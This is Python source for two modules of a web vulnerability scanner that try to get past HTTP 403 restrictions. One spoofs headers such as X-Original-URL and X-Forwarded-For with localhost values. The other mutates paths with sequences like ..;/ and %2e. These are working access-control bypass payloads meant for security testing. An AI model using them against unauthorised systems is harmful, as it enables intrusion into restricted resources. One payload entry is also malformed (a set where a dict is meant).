
from core.scanner.module import *


class HeadersBased403Bypasser( HeadersScanner ):

    def __init__(self, config: ModuleConfig, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "Forbidden Bypasser",
        "Risk": Risk.Medium,
        "Referances": [
            "https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/",
            "https://github.com/PortSwigger/403-bypasser",
            "https://github.com/yunemse48/403bypasser"
        ]
    }) -> None:
        HeadersScanner.__init__(self, config, info)

    def check(self) -> bool:
        try:
            req = self.GetRequester()
            res = req.Send()
        except:
            return False

        return res.status_code == 403

    def GetPayloads(self):
        path = self.endpoint.GetPath()

        payloads = [
            {
                "X-Original-URL": path
            },
            {
                "X-Rewrite-URL", path
            }
        ]

        headers = ["X-Custom-IP-Authorization", "X-Forwarded-For", 
                "X-Forward-For", "X-Remote-IP", "X-Originating-IP", 
                "X-Remote-Addr", "X-Client-IP", "X-Real-IP"]
        
        values = ["localhost", "localhost:80", "localhost:443", 
                "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", 
                "2130706433", "0x7F000001", "0177.0000.0000.0001", 
                "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0", 
                "172.16.0.1", "192.168.1.0", "192.168.1.1"]

        for hname in headers:
            for value in values:
                payloads.append({
                    hname: value
                })

        return payloads

    def is_vulnerable(self, response) -> bool:
        return response.status_code >= 200 and response.status_code < 400


class UriBased403Bypasser( UriScanner ):

    def __init__(self, config: ModuleConfig, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "Forbidden Bypasser",
        "Risk": Risk.Medium,
        "Referances": [
            "https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/",
            "https://github.com/PortSwigger/403-bypasser",
            "https://github.com/yunemse48/403bypasser"
        ]
    }) -> None:
        UriScanner.__init__(self, config, info)

        # To overwrite the beginning of path with malicious inputs 'http://host..;/path'
        self.AllowPathManipulation()

    def check(self) -> bool:
        try:
            req = self.GetRequester()
            res = req.Send()
        except:
            return False

        return res.status_code == 403

    def GetPayloads(self) -> list:
        payloads = list()
        path = self.GetPath()

        pairs = [["/", "//"], ["/.", "/./"]]
        
        leadings = ["/%2e"]
        
        trailings = ["/", "..;/", "/..;/", "%20", "%09", "%00", 
                    ".json", ".css", ".html", "?", "??", "???", 
                    "?testparam", "#", "#test", "/."]
        
        for pair in pairs:
            payloads.append(pair[0] + path + pair[1])
        
        for leading in leadings:
            payloads.append(leading + path)
        
        for trailing in trailings:
            payloads.append(path + trailing)

        dirs = path.split('/')
        for idx in range(0, len(dirs)):
            temp = dirs.copy()
            temp[idx] += '..;'
            newpath = '/'.join(temp)
            payloads.append(newpath)

        return payloads

    def is_vulnerable(self, response) -> bool:
        return response.status_code >= 200 and response.status_code < 400
